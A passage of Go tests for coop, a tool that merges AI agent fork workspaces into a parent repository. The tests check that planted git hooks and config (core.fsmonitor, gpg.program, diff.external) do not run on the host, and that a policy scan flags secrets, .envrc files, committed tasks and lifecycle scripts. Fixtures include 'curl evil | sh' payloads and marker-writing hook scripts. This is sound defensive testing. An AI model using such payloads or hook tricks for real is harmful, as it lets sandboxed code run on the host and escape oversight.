	landed, err := mergeOneForTest(t, c, repo, "gate-img", "perf", false)
	if !landed || err != nil {
		t.Fatalf("mergeOne = (%v, %v), want (true, nil)", landed, err)
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("a green gate should have landed the fork")
	}
}

func TestMergeOnePolicyForce(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "leak")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, ".env"), []byte("S=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "leak")

	// Without --force the policy guard blocks the secret-like file.
	if landed, err := mergeOneForTest(t, c, repo, "", "leak", false); landed || err == nil {
		t.Fatalf("mergeOne(force=false) = (%v, %v), want blocked", landed, err)
	}
	if pathExists(filepath.Join(repo, ".env")) {
		t.Fatal(".env landed despite the policy block")
	}
	// With --force it lands.
	if landed, err := mergeOneForTest(t, c, repo, "", "leak", true); !landed || err != nil {
		t.Fatalf("mergeOne(force=true) = (%v, %v), want landed", landed, err)
	}
	if !pathExists(filepath.Join(repo, ".env")) {
		t.Error(".env not landed with --force")
	}
}

// plantForkBooby rigs a fork's agent-writable .git/ to run host commands: every git
// hook plus the config knobs that shell out (core.fsmonitor, core.hooksPath, and a
// forced commit.gpgsign with a planted gpg.program). Each writes a line to marker, so
// its existence proves something in the fork executed on the host.
func plantForkBooby(t *testing.T, ws, marker string) {
	t.Helper()
	hooks := filepath.Join(ws, ".git", "hooks")
	if err := os.MkdirAll(hooks, 0o755); err != nil {
		t.Fatal(err)
	}
	script := "#!/bin/sh\necho pwned >> " + marker + "\n"
	for _, h := range []string{"pre-rebase", "post-rewrite", "post-checkout", "post-commit", "post-merge"} {
		if err := os.WriteFile(filepath.Join(hooks, h), []byte(script), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	// A standalone script reused for the command-running config knobs (gpg.program
	// must still emit a signature, so it cats stdin after marking).
	evil := filepath.Join(ws, ".git", "evil.sh")
	if err := os.WriteFile(evil, []byte(script+"cat\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "config", "core.hooksPath", hooks)
	git(t, ws, "config", "core.fsmonitor", evil)
	git(t, ws, "config", "commit.gpgsign", "true")
	git(t, ws, "config", "gpg.program", evil)
}

// A fork's .git/ is agent-writable, so the host-side git commands a merge runs in it
// must not execute fork-planted hooks or command-running config.
func TestMergeOneIgnoresForkBooby(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}

	ws, err := forkspace.Setup(repo, "evil")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")
	// Advance the parent on a different file so landing must rebase/replay (which is
	// what fires pre-rebase/post-checkout/post-rewrite) rather than fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "other.txt"), []byte("p\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves")

	marker := filepath.Join(t.TempDir(), "PWNED")
	plantForkBooby(t, ws, marker)

	landed, err := mergeOneForTest(t, c, repo, "", "evil", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want landed", landed, err)
	}
	if pathExists(marker) {
		t.Fatalf("a fork-controlled git hook/config executed on the host during merge (marker created)")
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("merge did not land the fork's work")
	}
	// Positive control: the trap is live — a genuinely *raw* git command (bypassing coop's hardened
	// helpers entirely) fires it, so the clean run above is the hardening working, not a no-op test.
	_ = exec.Command("git", "-C", ws, "status", "--porcelain").Run() // raw → runs the planted core.fsmonitor
	if !pathExists(marker) {
		t.Fatal("positive control failed: raw fork git did not trigger the booby trap, so the test proves nothing")
	}
}

// A non-interactive `coop fork merge` must refuse without --yes (it lands work and
// deletes the fork), and proceed with it.
func TestForkMergeNonTTYRequiresYes(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	// Force a non-interactive stdin regardless of how the suite is run — a real TTY
	// would send the un-gated path into an interactive prompt and block.
	devnull, err := os.Open(os.DevNull)
	if err != nil {
		t.Fatal(err)
	}
	defer devnull.Close()
	saved := os.Stdin
	os.Stdin = devnull
	defer func() { os.Stdin = saved }()

	repo := initRepo(t)
	c := &Control{cfg: &config.Config{RepoOverride: repo}} // no gate → no box
	ws, err := forkspace.Setup(repo, "a")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "a.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")

	// Without --yes: refuse in the shared block, as every unconfirmed deletion is, before landing.
	var usage *ui.UsageError
	if code, err := c.ForkMerge([]string{"a"}); code != 2 || !errors.As(err, &usage) || usage.Headline != "Confirmation required" ||
		!strings.Contains(usage.Cause, "pass --yes to confirm") {
		t.Fatalf("ForkMerge(no --yes) = (%d, %v), want (2, Confirmation required)", code, err)
	}
	if pathExists(filepath.Join(repo, "a.txt")) {
		t.Error("a.txt landed despite the non-interactive refusal")
	}
	if !pathExists(ws) {
		t.Error("fork was removed despite the refusal")
	}

	// With --yes: lands and removes the fork.
	if code, err := c.ForkMerge([]string{"a", "--yes"}); err != nil || code != 0 {
		t.Fatalf("ForkMerge(--yes) = (%d, %v), want (0, nil)", code, err)
	}
	if !pathExists(filepath.Join(repo, "a.txt")) {
		t.Error("a.txt did not land with --yes")
	}
	if pathExists(ws) {
		t.Error("fork not removed after a --yes land")
	}
}

func TestForkMergeQueue(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	// Two independent forks, each adding a distinct file.
	for _, n := range []string{"a", "b"} {
		ws, err := forkspace.Setup(repo, n)
		if err != nil {
			t.Fatalf("forkspace.Setup %s: %v", n, err)
		}
		if err := os.WriteFile(filepath.Join(ws, n+".txt"), []byte(n+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		git(t, ws, "add", "-A")
		git(t, ws, "commit", "-qm", n)
	}
	names, err := forkspace.Names(repo)
	if err != nil {
		t.Fatal(err)
	}
	if code, err := c.forkMergeAll(repo, names, "", false, true); err != nil || code != 0 { // yes=true: approve the bulk land
		t.Fatalf("forkMergeAll = (%d, %v), want (0, nil)", code, err)
	}
	if !pathExists(filepath.Join(repo, "a.txt")) || !pathExists(filepath.Join(repo, "b.txt")) {
		t.Error("merge queue did not land both forks")
	}
	if got, err := forkspace.Names(repo); err != nil || len(got) != 0 {
		t.Errorf("forks remain after the queue closed them: %v", got)
	}
	// Rebasing must keep history linear — no merge commits.
	if merges := forkspace.GitOut(repo, "rev-list", "--merges", "HEAD"); merges != "" {
		t.Errorf("rebase queue produced merge commits (history not linear):\n%s", merges)
	}
}

// At a terminal the delete confirmation is a section of its own, with a blank line on either side.
// --yes asks nothing, so those two blank lines must not stack: `coop fork merge --yes` keeps exactly
// one blank line between sections, for one fork (with and without the service-data preview) and
// for --all.
// A fork's box can write the fork's repository, so it can make the merge policy's read fail: here
// by committing a history unrelated to the project's, which git cannot diff against it. The scan
// says so instead of reading as nothing flagged, merge refuses without --force, and a fork git can
// read still merges.
func TestForkMergeRefusesAForkItsPolicyScanCannotRead(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "orphan")
	if err != nil {
		t.Fatal(err)
	}
	git(t, ws, "checkout", "-q", "--orphan", "unrelated")
	writeTaskFile(t, filepath.Join(ws, "planted.txt"), "x\n")
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "unrelated history")
	git(t, ws, "checkout", "-q", "-B", "orphan", "unrelated") // the fork's own branch, which merge fetches
	git(t, repo, "fetch", "-q", ws, "orphan:refs/heads/review-orphan")
	if warns, err := PolicyScan(repo, "review-orphan"); err == nil {
		t.Fatalf("PolicyScan over an unrelated history = %q, nil; want the read failure", warns)
	}

	c := &Control{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}}
	var code int
	stderr := captureStderr(t, func() { code, err = c.ForkMerge([]string{"orphan", "--yes"}) })
	if code == 0 || !strings.Contains(stderr+fmt.Sprint(err), "Coop could not check the fork's changes against the merge policy") {
		t.Fatalf("merge of an unreadable fork = (%d, %v)\n%s", code, err, stderr)
	}
	if !pathExists(ws) {
		t.Fatal("the refused merge removed the fork")
	}

	ok, err := forkspace.Setup(repo, "readable")
	if err != nil {
		t.Fatal(err)
	}
	writeTaskFile(t, filepath.Join(ok, "fine.txt"), "fine\n")
	git(t, ok, "add", "-A")
	git(t, ok, "commit", "-qm", "fine")
	if code, err := c.ForkMerge([]string{"readable", "--yes"}); code != 0 || err != nil {
		t.Fatalf("merge of a readable fork = (%d, %v)", code, err)
	}
}

// A .coopignore decides what every later box is shown, so a fork that changes one in any way waits
// for --force, with the file named: an edit that drops a rule, one that adds a rule, a removal and
// a rename alike.
func TestPolicyScanFlagsAnyChangeToACoopignore(t *testing.T) {
	for _, tc := range []struct {
		name   string
		change func(t *testing.T, repo string)
		want   string
	}{
		{"an edit that drops a rule", func(t *testing.T, repo string) {
			writeTaskFile(t, filepath.Join(repo, ".coopignore"), "notes/\n")
		}, ".coopignore"},
		{"an edit that adds a rule", func(t *testing.T, repo string) {
			writeTaskFile(t, filepath.Join(repo, ".coopignore"), "secrets/\nnotes/\nmore/\n")
		}, ".coopignore"},
		{"a nested one added", func(t *testing.T, repo string) {
			writeTaskFile(t, filepath.Join(repo, "web", ".coopignore"), "build/\n")
		}, "web/.coopignore"},
		{"a nested one added in another case", func(t *testing.T, repo string) {
			writeTaskFile(t, filepath.Join(repo, "web", ".COOPIGNORE"), "build/\n") // the rules on a Mac disk
		}, "web/.COOPIGNORE"},
		{"a removal", func(t *testing.T, repo string) {
			git(t, repo, "rm", "-q", ".coopignore")
		}, ".coopignore"},
		{"a rename", func(t *testing.T, repo string) {
			git(t, repo, "mv", ".coopignore", "rules.txt")
		}, ".coopignore"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			repo := initRepo(t)
			writeTaskFile(t, filepath.Join(repo, ".coopignore"), "secrets/\nnotes/\n")
			git(t, repo, "add", "-A")
			git(t, repo, "commit", "-qm", "rules")
			git(t, repo, "checkout", "-q", "-b", "candidate")
			tc.change(t, repo)
			git(t, repo, "add", "-A")
			git(t, repo, "commit", "-qm", "change the rules")
			git(t, repo, "checkout", "-q", "main")
			want := tc.want + " — the fork changes a .coopignore, which decides what boxes are shown"
			if got := mustPolicyScan(t, repo, "candidate"); !slices.Contains(got, want) {
				t.Fatalf("PolicyScan = %q, want %q", got, want)
			}
		})
	}
}

func TestForkMergeYesPrintsOneBlankLineBetweenSections(t *testing.T) {
	for _, tc := range []struct {
		name     string
		args     []string
		forks    []string
		services bool // the project has a compose file, so deleting a fork deletes its service data
		want     string
	}{
		{name: "one fork", args: []string{"a", "--yes"}, forks: []string{"a"}, want: "" +
			"Merge fork a into main\n" +
			"  1 commit · +1 −0\n" +
			"\n" +
			"Rebasing onto main\n" +
			"\n" +
			"✓ Merged fork a into main\n" +
			"\n" +
			"✓ Deleted fork a\n"},
		{name: "one fork with services", args: []string{"a", "--yes"}, forks: []string{"a"}, services: true, want: "" +
			"Merge fork a into main\n" +
			"  1 commit · +1 −0\n" +
			"\n" +
			"Rebasing onto main\n" +
			"\n" +
			"✓ Merged fork a into main\n" +
			"\n" +
			"Will be permanently deleted:\n" +
			"  - This fork's service containers, Docker volumes, and their stored data.\n" +
			"\n" +
			"✓ Deleted fork a\n"},
		{name: "all", args: []string{"--all", "--yes"}, forks: []string{"a", "b"}, want: "" +
			"Process 2 forks for merge into main\n" +
			"  a\n" +
			"  b\n" +
			"\n" +
			"After processing:\n" +
			"  - Each fork that lands will be deleted.\n" +
			"  - A fork with no new commits or pending landing will be kept.\n" +
			"\n" +
			"Rebasing onto main\n" +
			"\n" +
			"✓ Merged fork a into main\n" +
			"✓ Deleted fork a\n" +
			"Rebasing onto main\n" +
			"\n" +
			"✓ Merged fork b into main\n" +
			"✓ Deleted fork b\n" +
			"\n" +
			"✓ Merged 2 forks\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			repo := initRepo(t)
			if tc.services { // committed before forking, so the merge's policy scan never sees it
				writeTaskFile(t, filepath.Join(repo, filepath.FromSlash(project.DefaultCompose)), "services: {}\n")
				git(t, repo, "add", "-A")
				git(t, repo, "commit", "-qm", "services")
			}
			for _, n := range tc.forks {
				ws, err := forkspace.Setup(repo, n)
				if err != nil {
					t.Fatal(err)
				}
				writeTaskFile(t, filepath.Join(ws, n+".txt"), n+"\n")
				git(t, ws, "add", "-A")
				git(t, ws, "commit", "-qm", n)
			}
			// No gate and no runtime, so only the merge's own lines reach stderr.
			c := &Control{cfg: &config.Config{RepoOverride: repo, ConfigDir: t.TempDir()}}
			var code int
			var err error
			stderr := captureStderr(t, func() { code, err = c.ForkMerge(tc.args) })
			if code != 0 || err != nil {
				t.Fatalf("ForkMerge(%v) = (%d, %v), want (0, nil)\n%s", tc.args, code, err, stderr)
			}
			if stderr != tc.want {
				t.Errorf("ForkMerge(%v) printed\n%q\nwant\n%q", tc.args, stderr, tc.want)
			}
		})
	}
}

// Task (security 1): every host-side git command coop runs against the PARENT repo must be
// hardened too — the parent's .git (config + hooks) is agent-writable on a normal box run, so a
// poisoned knob must not execute host code when coop reads/merges/diffs it. Each case fires a
// positive control with genuinely raw git, so a green test means the hardening works, not a dead
// trap. (Forks were already covered by TestMergeOneIgnoresForkBooby; this guards the parent.)
func TestHostGitHardeningOnPoisonedParent(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	markerScript := func(t *testing.T, path, marker string) {
		t.Helper()
		if err := os.WriteFile(path, []byte("#!/bin/sh\necho pwned >> "+marker+"\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}

	// (a) a poisoned core.fsmonitor must not fire when coop runs `git status` (gitDirty).
	t.Run("fsmonitor on status", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		evil := filepath.Join(repo, ".git", "evil.sh")
		markerScript(t, evil, marker)
		git(t, repo, "config", "core.fsmonitor", evil)
		_ = gitDirty(repo) // hardened — must not run fsmonitor
		if pathExists(marker) {
			t.Fatal("gitDirty ran the parent's core.fsmonitor on the host")
		}
		_ = exec.Command("git", "-C", repo, "status", "--porcelain").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git status did not fire the planted fsmonitor")
		}
	})

	// (b) a planted post-merge hook must not fire through the merge helper (FastForwardParent ff's the parent).
	t.Run("post-merge hook on merge", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		hooks := filepath.Join(repo, ".git", "hooks")
		if err := os.MkdirAll(hooks, 0o755); err != nil {
			t.Fatal(err)
		}
		markerScript(t, filepath.Join(hooks, "post-merge"), marker)
		git(t, repo, "config", "core.hooksPath", ".git/hooks")
		ahead := func(branch string) { // a branch one commit ahead of main, so --ff-only fast-forwards
			git(t, repo, "checkout", "-q", "-b", branch)
			if err := os.WriteFile(filepath.Join(repo, branch+".txt"), []byte("x\n"), 0o644); err != nil {
				t.Fatal(err)
			}
			git(t, repo, "add", "-A")
			git(t, repo, "commit", "-qm", branch)
			git(t, repo, "checkout", "-q", "main")
		}
		ahead("a1")
		if err := forkspace.GitRun(repo, "merge", "--ff-only", "a1"); err != nil { // hardened
			t.Fatalf("merge a1: %v", err)
		}
		if pathExists(marker) {
			t.Fatal("the parent's post-merge hook fired through the hardened merge helper")
		}
		ahead("a2")
		_ = exec.Command("git", "-C", repo, "merge", "--ff-only", "a2").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git merge did not fire the planted post-merge hook")
		}
	})

	// (c) a poisoned diff.external must not run when coop diffs the parent.
	t.Run("diff.external on diff", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		evil := filepath.Join(repo, ".git", "evil.sh")
		markerScript(t, evil, marker)
		git(t, repo, "config", "diff.external", evil)
		if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("changed\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		_ = forkspace.GitOut(repo, "diff") // hardened — diff.external blanked
		if pathExists(marker) {
			t.Fatal("GitOut diff ran the parent's diff.external on the host")
		}
		_ = exec.Command("git", "-C", repo, "diff").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git diff did not run the planted diff.external")
		}
	})
}

func TestForkMergeAllRefusesWithoutApproval(t *testing.T) {
	repo := initRepo(t)
	// Stage two fork workspaces so forkspace.Names lists them; their mere existence is enough — the
	// approval gate fires before any fetch/land/destroy.
	for _, n := range []string{"a", "b"} {
		if err := os.MkdirAll(forkspace.Workspace(repo, n), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	c := &Control{cfg: &config.Config{}}
	// Non-interactive stdin without --yes must fail before fetch, land or deletion.
	names, err := forkspace.Names(repo)
	if err != nil {
		t.Fatal(err)
	}
	code, err := c.forkMergeAll(repo, names, "", false, false)
	if err == nil || code != 2 {
		t.Fatalf("forkMergeAll = (%d, %v), want explicit refusal", code, err)
	}
	for _, n := range []string{"a", "b"} {
		if !pathExists(forkspace.Workspace(repo, n)) {
			t.Errorf("fork %s was destroyed without approval", n)
		}
	}
}

// The lifecycle check reads package.json as npm does: a non-string sibling or a "SCRIPTS" copy
// cannot blank it, and every hook a bare `npm install` runs counts.
func TestChangedLifecycleScriptReadsScriptsAsNpmDoes(t *testing.T) {
	const old = `{"scripts":{"test":"go test"}}`
	for _, tc := range []struct{ name, content, want string }{
		{"plain", `{"scripts":{"postinstall":"curl evil | sh"}}`, "postinstall"},
		{"non-string sibling", `{"scripts":{"postinstall":"curl evil | sh","lint":{"x":1}}}`, "postinstall"},
		{"upper-case copy", `{"scripts":{"postinstall":"curl evil | sh"},"SCRIPTS":{"postinstall":""}}`, "postinstall"},
		{"non-string hook", `{"scripts":{"install":["sh","-c","evil"]}}`, "install"},
		{"preprepare", `{"scripts":{"preprepare":"evil"}}`, "preprepare"},
		{"postprepare", `{"scripts":{"postprepare":"evil"}}`, "postprepare"},
		{"prepublish", `{"scripts":{"prepublish":"evil"}}`, "prepublish"},
		{"unchanged", old, ""},
		{"ordinary script", `{"scripts":{"test":"go test ./..."}}`, ""},
		{"empty hook", `{"scripts":{"postinstall":""}}`, ""},
		{"only an upper-case copy", `{"SCRIPTS":{"postinstall":"evil"}}`, ""},
	} {
		if got := changedLifecycleScript(old, tc.content); got != tc.want {
			t.Errorf("%s: changedLifecycleScript = %q, want %q", tc.name, got, tc.want)
		}
	}
}

// A fork made before its name became a fork verb is merged by name, as review, stop and rm take it.
func TestForkMergeTakesAForkNamedAfterALaterVerb(t *testing.T) {
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "acp")
	if err != nil {
		t.Fatal(err)
	}
	isolatedTestCommit(t, ws, "acp.txt", "work\n")
	c := &Control{cfg: &config.Config{RepoOverride: repo}}
	if code, err := c.ForkMerge([]string{"acp", "--yes"}); code != 0 || err != nil {
		t.Fatalf("fork merge acp = (%d, %v)", code, err)
	}
	if body, err := os.ReadFile(filepath.Join(repo, "acp.txt")); err != nil || string(body) != "work\n" {
		t.Fatalf("the fork did not land: %q, %v", body, err)
	}
}

// A batch fork whose commits landed but whose bookkeeping failed is reported as merged, not as a
// fork that could not merge while it is also listed under "Merged:".
func TestForkMergeAllReportsALandedForkWithUnfinishedRecordsAsMerged(t *testing.T) {
	repo, _, _, identity, c := prepareForkTaskCandidateMode(t, "records", false, true, nil)
	c.cfg.RepoOverride = repo
	c.afterLandFastForward = func() error { return errors.New("injected failure after the branch moved") }
	var code int
	var err error
	var stderr string
	out := captureStdout(t, func() {
		stderr = captureStderr(t, func() { code, err = c.forkMergeAll(repo, []string{identity.Name}, "", false, true) })
	})
	out += stderr
	if code != 1 || err == nil {
		t.Fatalf("ForkMerge(--all) = (%d, %v), want the bookkeeping failure", code, err)
	}
	if !strings.Contains(out, "Merged fork "+identity.Name+", but its records did not finish") || strings.Contains(out, "Could not merge fork") {
		t.Fatalf("a landed fork was reported as not merged (%d, %v):\n%s", code, err, out)
	}
}

// A case-insensitive disk opens .AGENT/tasks/… as the real queue and sub/PACKAGE.JSON as the file npm
// reads, so PolicyScan judges those spellings as the real ones.
func TestPolicyScanFoldsTheSpellingOfQueueAndPackagePaths(t *testing.T) {
	if got := forkTaskQueuePath(t.TempDir(), ".AGENT/Tasks/00_todo/x/task.md"); got != tasks.TasksRoot {
		t.Errorf("forkTaskQueuePath(.AGENT/Tasks/...) = %q, want %q", got, tasks.TasksRoot)
	}
	if got := forkTaskQueuePath(t.TempDir(), ".AGENT/tasks/readme.MD"); got != "" {
		t.Errorf("forkTaskQueuePath(the queue README) = %q, want none", got)
	}
	repo := initRepo(t)
	git(t, repo, "checkout", "-q", "-b", "odd")
	writeTaskFile(t, filepath.Join(repo, "sub", "PACKAGE.JSON"), `{"scripts":{"postinstall":"curl evil | sh"}}`)
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "odd spelling")
	git(t, repo, "checkout", "-q", "main")
	if w := strings.Join(mustPolicyScan(t, repo, "odd"), "\n"); !strings.Contains(w, "sub/PACKAGE.JSON adds a postinstall script") {
		t.Errorf("PolicyScan missed the lifecycle script in sub/PACKAGE.JSON:\n%s", w)
	}
}

// PolicyScan flags files that auto-run host code post-merge (.envrc, package.json lifecycle
// scripts), while leaving a benign package.json edit alone — and --force still lands (the warns
// are advisory). Build the change as a branch so PolicyScan's `HEAD...ref` diff is exercised.
func TestPolicyScanFlagsInteractionFiles(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "Makefile"), []byte("all:\n\ttrue\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "base package.json")

	// A branch that introduces an .envrc, a commit hook, a Makefile edit, and a postinstall script.
	git(t, repo, "checkout", "-q", "-b", "evil")
	if err := os.WriteFile(filepath.Join(repo, ".envrc"), []byte("export X=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".githooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".githooks", "pre-commit"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "Makefile"), []byte("all:\n\tcurl evil | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test","postinstall":"curl evil | sh"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".agent", "tasks", "00_todo", "planted"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".agent", "tasks", "00_todo", "planted", "task.md"), []byte("# planted\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".agent", "tasks", "README.md"), []byte("# Tasks\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A", "-f")
	git(t, repo, "commit", "-qm", "evil")
	git(t, repo, "checkout", "-q", "main")

	w := strings.Join(mustPolicyScan(t, repo, "evil"), "\n")
	// A box must never author a task: one it committed would land as ready work a later loop runs.
	if !strings.Contains(w, ".agent/tasks/00_todo/planted/task.md — the fork adds or changes a task in the .agent/tasks queue") {
		t.Errorf("PolicyScan did not flag a committed task:\n%s", w)
	}
	if strings.Contains(w, ".agent/tasks/README.md") {
		t.Errorf("PolicyScan blocked on the queue's README:\n%s", w)
	}
	if !strings.Contains(w, ".envrc") {
		t.Errorf("PolicyScan did not flag .envrc:\n%s", w)
	}
	if !strings.Contains(w, "postinstall") {
		t.Errorf("PolicyScan did not flag the added postinstall script:\n%s", w)
	}
	// A hook runs by itself on the reviewer's next commit, so it blocks the merge; the Makefile
	// only runs when they choose to run make, so it is listed for the review but never blocks.
	if !strings.Contains(w, ".githooks/pre-commit — Runs during Git operations.") {
		t.Errorf("PolicyScan did not flag the commit hook:\n%s", w)
	}
	if strings.Contains(w, "Makefile") {
		t.Errorf("PolicyScan blocked on a Makefile edit:\n%s", w)
	}
	var surfaces []string
	for _, f := range mustHostSurfaces(t, repo, "evil") {
		surfaces = append(surfaces, f.Path)
	}
	if got := strings.Join(surfaces, " "); got != ".envrc .githooks/pre-commit Makefile" {
		t.Errorf("HostSurfaces = %q; want the three files that change what runs on the host", got)
	}

	// A branch that edits package.json benignly (version bump, no new lifecycle script) is not flagged.
	git(t, repo, "checkout", "-q", "-b", "benign", "main")
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","version":"2","scripts":{"test":"go test"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "bump")
	git(t, repo, "checkout", "-q", "main")
	if w := strings.Join(mustPolicyScan(t, repo, "benign"), "\n"); strings.Contains(w, "package.json adds") {
		t.Errorf("a benign package.json edit was wrongly flagged:\n%s", w)
	}
}

func TestPolicyScanHiddenAncestors(t *testing.T) {
	repo := initRepo(t)
	writeTaskFile(t, filepath.Join(repo, ".coopignore"), "private/\n")
	git(t, repo, "add", ".coopignore")
	git(t, repo, "commit", "-qm", "hidden directory policy")
	git(t, repo, "checkout", "-q", "-b", "candidate")
	for _, rel := range []string{"private/ordinary.go", "public/ordinary.go"} {
		writeTaskFile(t, filepath.Join(repo, rel), "package fixture\n")
	}
	git(t, repo, "add", "private/ordinary.go", "public/ordinary.go")
	git(t, repo, "commit", "-qm", "public synthetic files")
	git(t, repo, "checkout", "-q", "main")
	if got := strings.Join(mustPolicyScan(t, repo, "candidate"), "\n"); got != "secret-like file: private/ordinary.go" {
		t.Fatalf("PolicyScan = %q; want only the descendant of the hidden directory", got)
	}
}

// A .coopignore coop cannot read leaves unknown which changed files it hides, so the scan says so
// once, naming it, and the merge waits for --force; it does not call the changed files secret.
func TestPolicyScanNamesAnUnreadableCoopignore(t *testing.T) {
	repo := initRepo(t)
	git(t, repo, "checkout", "-q", "-b", "candidate")
	for _, rel := range []string{"config/a.go", "config/b.go"} {
		writeTaskFile(t, filepath.Join(repo, rel), "package fixture\n")
	}
	git(t, repo, "add", "config")
	git(t, repo, "commit", "-qm", "public synthetic files")
	git(t, repo, "checkout", "-q", "main")
	if err := os.Mkdir(filepath.Join(repo, ".coopignore"), 0o755); err != nil {
		t.Fatal(err)
	}
	want := "coop cannot tell what .coopignore hides, because it is a folder — remove it if you did not create it, " +
		"or make it a readable regular file of at most 1 MiB, then merge again"
	if got := strings.Join(mustPolicyScan(t, repo, "candidate"), "\n"); got != want {
		t.Fatalf("PolicyScan = %q; want one warning naming the .coopignore", got)
	}
}

// A file the readable rules hide is still named when another .coopignore above it cannot be read:
// a rule in the root .coopignore, its own name or a folder's name above it. Forcing the merge past
// the unreadable .coopignore must not land a db.prod.json or a .env nobody saw. The file the
// readable rules leave visible gets the one warning that names the unreadable .coopignore.
func TestPolicyScanNamesASecretUnderAnUnreadableCoopignore(t *testing.T) {
	repo := initRepo(t)
	writeTaskFile(t, filepath.Join(repo, ".coopignore"), "*.prod.json\n")
	git(t, repo, "add", ".coopignore")
	git(t, repo, "commit", "-qm", "rules")
	git(t, repo, "checkout", "-q", "-b", "candidate")
	// A secret folder hides what it holds whatever the file is called, so those files count too.
	secrets := []string{"config/sub/.aws/config", "config/sub/.env", "config/sub/db.prod.json", "config/sub/secrets/token.txt"}
	for _, path := range secrets {
		writeTaskFile(t, filepath.Join(repo, filepath.FromSlash(path)), "TOKEN=x\n")
	}
	writeTaskFile(t, filepath.Join(repo, "config", "sub", "app.yml"), "name: app\n")
	git(t, repo, "add", "config")
	git(t, repo, "commit", "-qm", "secrets under config")
	git(t, repo, "checkout", "-q", "main")
	if err := os.MkdirAll(filepath.Join(repo, "config", ".coopignore"), 0o755); err != nil {
		t.Fatal(err)
	}
	got := mustPolicyScan(t, repo, "candidate")
	var named []string
	unreadable := 0
	for _, warn := range got {
		if path, ok := strings.CutPrefix(warn, "secret-like file: "); ok {
			named = append(named, path)
		}
		if strings.HasPrefix(warn, "coop cannot tell what config/.coopignore hides, because it is a folder") {
			unreadable++
		}
	}
	slices.Sort(named)
	if !slices.Equal(named, secrets) || unreadable != 1 {
		t.Errorf("PolicyScan = %q; want %q named and one warning for config/.coopignore", got, secrets)
	}
}

// A fork that turns a .coopignore into a link or a folder would make every later launch in the
// project refuse, so the merge names it and waits for --force.
func TestPolicyScanFlagsAForkThatLinksItsCoopignore(t *testing.T) {
	for _, tc := range []struct {
		name, flagged string
		replace       func(path string) error
	}{
